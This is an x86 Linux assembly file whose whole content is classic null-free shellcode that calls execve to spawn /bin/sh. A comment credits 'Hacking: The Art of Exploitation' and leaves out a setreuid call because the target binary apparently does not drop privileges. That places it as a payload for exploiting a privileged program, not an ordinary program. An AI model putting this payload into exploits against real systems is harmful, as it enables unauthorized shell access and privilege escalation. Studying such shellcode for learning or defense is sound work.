section .data

section .text

global _start
_start:

; This shellcode is based on John erikson's hacking the art of exploitation
; setreuid(uid_t ruid, uid_t euid)
;No need for the setreuid here as the binary does not drop privileges
;push byte 70
;pop eax
;xor ebx,ebx
;xor ecx,ecx
;int 0x80

xor eax,eax
xor ebx,ebx
xor ecx, ecx
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push ecx
push ebx
mov ecx,esp
cdq
mov al, 11
int 0x80

